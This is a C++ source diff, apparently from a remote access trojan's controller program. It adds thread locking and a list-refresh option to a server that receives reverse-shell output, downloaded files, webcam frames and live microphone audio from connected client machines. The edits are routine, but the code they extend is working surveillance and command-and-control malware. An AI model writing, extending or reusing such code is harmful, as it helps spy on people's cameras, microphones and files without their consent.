@@ -12,6 +12,7 @@
 Servidor* p_Servidor;
 std::mutex vector_mutex;
 std::mutex count_mutex;
+std::mutex list_mutex;
 
 bool Cliente_Handler::OpenPlayer() {
     WAVEFORMATEX wfx = {};
@@ -68,10 +69,15 @@ void Cliente_Handler::Spawn_Handler(){
     while (true) {
 
         if (!this->isfRunning() || this->p_Cliente._sckCliente == INVALID_SOCKET) {
+            std::unique_lock<std::mutex> lock(this->mt_Running);
+            this->iRecibido = WSA_FUNADO;
             break;
         }
         
-        int iRecibido = p_Servidor->cRecv(this->p_Cliente._sckCliente, cBuffer, iBufferSize-1, 0, true);
+        int iTempRecibido = p_Servidor->cRecv(this->p_Cliente._sckCliente, cBuffer, iBufferSize - 1, 0, true);
+        this->SetBytesRecibidos(iTempRecibido);
+
+        //this->iRecibido = p_Servidor->cRecv(this->p_Cliente._sckCliente, cBuffer, iBufferSize-1, 0, true);
 
         //timeout
         if (WSAGetLastError() == WSAETIMEDOUT) {
@@ -85,20 +91,22 @@ void Cliente_Handler::Spawn_Handler(){
         //}
 
         //Desconexion del cliente
-        if ((iRecibido <= 0 && WSAGetLastError() != WSAEWOULDBLOCK) || iRecibido == WSAECONNRESET) {
+        if ((this->BytesRecibidos() <= 0 && WSAGetLastError() != WSAEWOULDBLOCK) || this->BytesRecibidos() == WSAECONNRESET) {
             //Si la ventana sigue abierta
             FrameCliente* temp_cli = (FrameCliente*)wxWindow::FindWindowByName(this->p_Cliente._id);
             if (temp_cli) {
                 temp_cli->SetTitle(this->p_Cliente._id + " [DESCONECTADO]");
             }
+            std::unique_lock<std::mutex> lock(this->mt_Running);
+            this->iRecibido = WSA_FUNADO;
             break;
         }
 
-        if (iRecibido <= 0) {
+        if (this->BytesRecibidos() <= 0) {
             continue;
         }
 
-        cBuffer[iRecibido] = '\0';
+        cBuffer[this->BytesRecibidos()] = '\0';
 
         std::vector<std::string> vcDatos = strSplit(std::string(cBuffer), CMD_DEL, 1);
         if (vcDatos.size() == 0) {
@@ -112,7 +120,7 @@ void Cliente_Handler::Spawn_Handler(){
             if (vcDatos.size() == 2) {
                 // CMD + 2 slashs /  +len del id
                 int iHeader = 5 + vcDatos[1].size();
-                int iBytesSize = iRecibido - iHeader;
+                int iBytesSize = this->BytesRecibidos() - iHeader;
                 char* cBytes = cBuffer + iHeader;
 
                 FILE* fp = this->um_Archivos_Descarga[vcDatos[1]].iFP;
@@ -155,6 +163,7 @@ void Cliente_Handler::Spawn_Handler(){
 
         //Termino la shell
         if (vcDatos[0] == std::to_string(EnumComandos::Reverse_Shell_Finish)) { 
+            this->EscribirSalidShell(std::string("Sapeeeeeeeeeeee"));
             continue;
         }
 
@@ -361,7 +370,7 @@ void Cliente_Handler::Spawn_Handler(){
                 //CMD DEL ID_DEV DEL BUFFER
                 this->Log(cBuffer);
                 int iHeadSize = (std::to_string(EnumComandos::CM_Single_Salida).size() + 2) + vcDatos[1].size(); //CMD + len de dos delimitador + len del id del dev
-                int iBuffSize = iRecibido - iHeadSize;
+                int iBuffSize = this->BytesRecibidos() - iHeadSize;
                 char* cBytes = cBuffer + iHeadSize;
                 panelPictureBox* panel_picture = (panelPictureBox*)wxWindow::FindWindowByName("CAM" + vcDatos[1], this->n_Frame);
                 if (panel_picture) {
@@ -411,7 +420,7 @@ void Cliente_Handler::Spawn_Handler(){
 
         if (vcDatos[0] == std::to_string(EnumComandos::Mic_Live_Packet)) {
             int iHeadSize = vcDatos[0].size() - 1;
-            int iRawSize = iRecibido - iHeadSize;
+            int iRawSize = this->BytesRecibidos() - iHeadSize;
             char* cBuff = cBuffer + iHeadSize;
             this->PlayBuffer(cBuff, iRawSize);
             continue;
@@ -423,6 +432,9 @@ void Cliente_Handler::Spawn_Handler(){
         delete[] cBuffer;
         cBuffer = nullptr;
     }
+
+    std::cout << "DONE!\n";
+
 
 }
 
@@ -642,7 +654,7 @@ void Servidor::m_CleanVector() {
     std::unique_lock<std::mutex> lock(vector_mutex);
     for (auto& cliente : this->vc_Clientes) {
         cliente->Stop();
-
+        Sleep(100);
         delete cliente;
         cliente = nullptr;
 
@@ -822,6 +834,8 @@ int Servidor::IndexOf(std::string strID) {
 }
 
 void Servidor::m_InsertarCliente(struct Cliente& p_Cliente){
+    std::unique_lock<std::mutex> lock(list_mutex);
+
     int iIndex = this->m_listCtrl->GetItemCount();
 
     this->m_listCtrl->InsertItem(iIndex, wxString(p_Cliente._id));
@@ -830,10 +844,11 @@ void Servidor::m_InsertarCliente(struct Cliente& p_Cliente){
     this->m_listCtrl->SetItem(iIndex, 3, wxString(p_Cliente._strSo));
     this->m_listCtrl->SetItem(iIndex, 4, wxString(p_Cliente._strPID));
     this->m_listCtrl->SetItem(iIndex, 5, wxString(p_Cliente._strCpu));
-
 }
 
 void Servidor::m_RemoverClienteLista(std::string p_ID){
+    std::unique_lock<std::mutex> lock(list_mutex);
+
     long lFound = this->m_listCtrl->FindItem(0, wxString(p_ID));
     if(lFound != wxNOT_FOUND){
         this->m_listCtrl->DeleteItem(lFound);
@@ -968,8 +983,8 @@ void MyListCtrl::ShowContextMenu(const wxPoint& pos, long item) {
     wxMenu menu;
     menu.Append(EnumIDS::ID_Interactuar, "Administrar");
     menu.AppendSeparator();
-    menu.Append(wxID_ANY, ":v");
-
+    menu.Append(EnumIDS::ID_Refrescar, "Refrescar");
+    
     PopupMenu(&menu, pos.x, pos.y);
 }
 
@@ -1027,11 +1042,6 @@ void MyListCtrl::OnInteractuar(wxCommandEvent& event) {
             break;
         }
     }
-
-    lock.unlock();
-
-    //FrameCliente* n_FrameCli = new FrameCliente(this->strTmp.ToStdString(), vcOut[0]);
-    //n_FrameCli->Show(true);
 }
 
 void MyListCtrl::OnActivated(wxListEvent& event) {
@@ -1051,5 +1061,14 @@ void MyListCtrl::OnActivated(wxListEvent& event) {
                 break;
             }
         }
+    }
+}
+
+void MyListCtrl::OnRefrescar(wxCommandEvent& event) {
+    this->DeleteAllItems();
+    std::unique_lock<std::mutex> lock(vector_mutex);
+
+    for (auto& cliente : p_Servidor->vc_Clientes) {
+        p_Servidor->m_InsertarCliente(cliente->p_Cliente);
     }
 }
